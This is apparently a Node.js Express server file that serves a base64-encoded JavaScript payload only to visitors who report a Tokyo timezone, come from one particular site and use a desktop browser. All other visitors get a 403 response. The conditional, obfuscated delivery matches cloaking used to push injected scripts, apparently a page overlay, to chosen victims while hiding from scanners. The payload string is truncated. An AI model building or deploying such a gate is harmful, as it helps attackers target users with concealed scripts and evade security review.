// index.js
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// For parsing JSON in POST
app.use(express.json());

function isPC(userAgent) {
  return !/mobile|android|iphone|ipad/i.test(userAgent);
}

app.post('/', (req, res) => {
  const { timezone, fullUrl } = req.body;
  const referer = req.headers.referer || '';
  const userAgent = req.headers['user-agent'] || '';

  const passedTimezone = timezone === 'Asia/Tokyo';
  const passedReferer = fullUrl.includes('pizeonflywebdeveloper.site');
  const passedDevice = isPC(userAgent);

  if (passedTimezone && passedReferer && passedDevice) {
    // Send base64 payload
    return res.send("ZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LnN0eWxlLm92ZXJmbG93PSJoaWRkZW4iLGRvY3...");
  }

  res.status(403).send('Forbidden');
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
